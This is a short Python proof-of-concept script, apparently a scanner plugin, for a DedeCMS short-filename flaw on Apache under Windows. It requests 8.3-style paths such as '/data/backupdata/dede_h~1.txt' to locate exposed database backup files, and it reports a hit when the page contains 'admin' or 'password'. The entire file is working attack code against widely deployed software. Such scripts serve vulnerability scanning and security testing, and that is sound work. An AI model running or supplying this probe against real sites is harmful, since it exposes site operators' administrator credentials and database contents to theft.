#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms 短文件名漏洞
referer: https://www.t00ls.net/thread-48499-1-1.html
author: w8ay
description: 短文件名->apache+windows长文件名可用前6个字符+"~1".ext
'''
import HackRequests


def poc(arg, **kwargs):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payloads = ['/data/backupdata/dede_h~', '/data/backupdata/dede_m~', '/data/backupdata/dede_p~',
                '/data/backupdata/dede_a~', '/data/backupdata/dede_s~']
    hh = HackRequests.hackRequests()
    result = {}
    for payload in payloads:
        for number in range(1, 5):
            testurl = arg.strip() + payload + str(number) + ".txt"
            r = hh.http(testurl, headers=headers)
            html = r.text()
            if r.status_code == 200 and ("admin" in html or "密码" in html):
                result["name"] = "dedecms 备份数据库泄露"
                result["content"] = "服务器用了apache+windows配置，长文件可用前6个字符+~1.ext查找下载"
                result["url"] = testurl
                result["log"] = r.log
                result["tag"] = "info_leak"
                return result
